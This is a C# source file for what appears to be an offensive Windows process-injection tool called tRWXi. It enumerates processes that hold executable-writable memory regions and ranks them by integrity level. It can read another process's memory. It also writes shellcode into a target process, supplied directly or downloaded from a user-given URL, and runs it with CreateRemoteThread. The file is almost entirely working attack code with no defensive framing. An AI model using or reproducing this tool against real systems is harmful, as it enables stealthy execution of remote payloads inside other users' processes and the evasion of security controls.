using System;
using System.Collections.Generic;
using tRWXi.Data;
using System.Runtime.InteropServices;
using System.Linq;
using tRWXi.Utils;

using static tRWXi.Utils.Win32;

namespace tRWXi
{
    public class Program
    {
        public static void Main(string[] args)
        {
            try
            {
                Dictionary<string, string> parameters = Utils.ArgParser.parse(args);

                Win32.PROCESSENTRY32 pe = new Win32.PROCESSENTRY32();
                pe.dwSize = (uint)Marshal.SizeOf(pe);

                Win32.MEMORY_BASIC_INFORMATION mbi = new Win32.MEMORY_BASIC_INFORMATION();

                IntPtr lpAddress = IntPtr.Zero;

                IntPtr hSnapshot = Win32.CreateToolhelp32Snapshot(Win32.TH32CS_SNAPPROCESS, 0);

                bool hResult = Win32.Process32First(hSnapshot, ref pe);

                Dictionary<ProcessInfo, List<ProcessMemoryInfo>> processes = new Dictionary<ProcessInfo, List<ProcessMemoryInfo>>();

                IntPtr numberOfBytesWritten = IntPtr.Zero;

                string integrityLevel = "";

                int rank;

                if (parameters.ContainsKey("enumerate"))
                {
                    Console.WriteLine("[*] Started enumeration");

                    while (hResult)
                    {
                        IntPtr hProcess = Win32.OpenProcess(Win32.PROCESS_ALL_ACCESS, false, (int)pe.th32ProcessID);
                        ProcessInfo pi = new ProcessInfo((int)pe.th32ProcessID);

                        while (Win32.VirtualQueryEx(hProcess, lpAddress, out mbi, Marshal.SizeOf(mbi)) != 0)
                        {
                            lpAddress = new IntPtr(mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
                            if (mbi.AllocationProtect == Win32.PAGE_EXECUTE_READ_WRITE && mbi.State == Win32.MEM_COMMIT && mbi.Type == Win32.MEM_PRIVATE)
                            {
                                if (!processes.ContainsKey(pi))
                                {
                                    processes[pi] = new List<ProcessMemoryInfo>();
                                }

                                pi.processName = pe.szExeFile;

                                IntPtr hToken;
                                unsafe
                                {
                                    OpenProcessToken(
                                        hProcess,
                                        Win32.TOKEN_QUERY,
                                        out hToken);

                                    var returnLength = 0U;

                                    GetTokenInformation(
                                        hToken,
                                        TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                                        IntPtr.Zero,
                                        0U,
                                        out returnLength);

                                    var lpTokenInfo = (Win32.TOKEN_MANDATORY_LABEL*)LocalAlloc((uint)Win32.LocalMemoryFlags.LMEM_FIXED, returnLength);
                                    
                                    IntPtr p = (IntPtr)lpTokenInfo;

                                    GetTokenInformation(
                                        hToken,
                                        TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                                        p,
                                        returnLength,
                                        out returnLength);

                                    var lpCount = GetSidSubAuthorityCount(lpTokenInfo->Label.Sid);
                                    var lpSubAuthority = GetSidSubAuthority(lpTokenInfo->Label.Sid, (uint)Marshal.ReadInt32(lpCount) - 1);

                                    switch ((uint)Marshal.ReadInt32(lpSubAuthority))
                                    {
                                        case >= (uint)Win32.IntegrityLevel.SystemIntegrity:
                                            integrityLevel = "SYSTEM";
                                            rank = 0;
                                            break;

                                        case >= (uint)Win32.IntegrityLevel.HighIntegrity:
                                            integrityLevel = "High";
                                            rank = 1;
                                            break;

                                        case >= (uint)Win32.IntegrityLevel.MediumIntegrity:
                                            integrityLevel = "Medium";
                                            rank = 2;
                                            break;

                                        case >= (uint)Win32.IntegrityLevel.LowIntegrity:
                                            integrityLevel = "Low";
                                            rank = 3;
                                            break;

                                        default:
                                            integrityLevel = "Untrusted";
                                            rank = 4;
                                            break;
                                    }

                                    pi.rank = rank;
                                    pi.integrityLevel = integrityLevel;

                                    processes[pi].Add(new ProcessMemoryInfo(mbi.BaseAddress, mbi.RegionSize));

                                    Win32.LocalFree(p);
                                    CloseHandle(hToken);
                                }
                            }
                        }
                        Win32.CloseHandle(hProcess);
                        hResult = Win32.Process32Next(hSnapshot, ref pe);
                        lpAddress = IntPtr.Zero;
                    }
                }
                else if (parameters.ContainsKey("inject") || parameters.ContainsKey("trigger") || parameters.ContainsKey("read"))
                {
                    if (parameters.ContainsKey("pid") && parameters.ContainsKey("address"))
                    {
                        int pid = Convert.ToInt32(parameters["pid"]);
                        IntPtr hProcess = Win32.OpenProcess(Win32.PROCESS_ALL_ACCESS, false, pid);
                        IntPtr addr = new IntPtr(Convert.ToInt64(parameters["address"], 16));

                        if (parameters.ContainsKey("read"))
                        {
                            int size = Convert.ToInt32(parameters["size"]);
                            byte[] output = new byte[size];
                            IntPtr written = new IntPtr();
                            Win32.ReadProcessMemory(hProcess, addr, output, size, out written);
                            Console.WriteLine(String.Format("[+] Memory [{0}] content: {1}", addr, BitConverter.ToString(output)));
                            Environment.Exit(0);
                        }
                        else if (parameters.ContainsKey("inject"))
                        {
                            byte[] data;
                            if (parameters.ContainsKey("data"))
                            {
                                data = Utils.Shellcoder.convert(parameters["data"]);
                            }
                            else if (parameters.ContainsKey("url"))
                            {
                                data = Utils.Shellcoder.fetch(parameters["url"]);
                            }
                            else
                            {
                                data = new byte[] { };
                            }
                            Console.WriteLine("[*] Started injection");
                            Win32.WriteProcessMemory(hProcess, addr, data, data.Length, out numberOfBytesWritten);
                            Console.WriteLine(String.Format("[+] {0} bytes written into RWX region", numberOfBytesWritten));
                        }
                        else {}

                        Console.WriteLine("[*] Starting execution...");
                        IntPtr res = Win32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

                        if ((int)res != 0)
                        {
                            Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", res.ToInt64()));
                        }
                        Environment.Exit(0);
                    }
                    else
                    {
                        Utils.Helper.help();
                        Environment.Exit(1);
                    }
                }
                else
                {
                    Utils.Helper.help();
                    Environment.Exit(1);
                }
                
                Win32.CloseHandle(hSnapshot);

                if (parameters.ContainsKey("enumerate"))
                {
                    var sortedProcesses = from entry in processes orderby entry.Key.rank descending select entry;

                    foreach (KeyValuePair<ProcessInfo, List<ProcessMemoryInfo>> kv in sortedProcesses)
                    {
                        Console.WriteLine(String.Format("[{0}] {1} -> {2}: ", kv.Key.integrityLevel, kv.Key.pid, kv.Key.processName));
                        foreach (ProcessMemoryInfo pmi in kv.Value)
                        {
                            Console.WriteLine(String.Format("\t\tbaseAddress:0x{0:X}\tsize::{1}", pmi.baseAddress.ToInt64(), pmi.size));
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[-] {0}", ex.Message));
                Environment.Exit(1);
            }
        }
    }
}
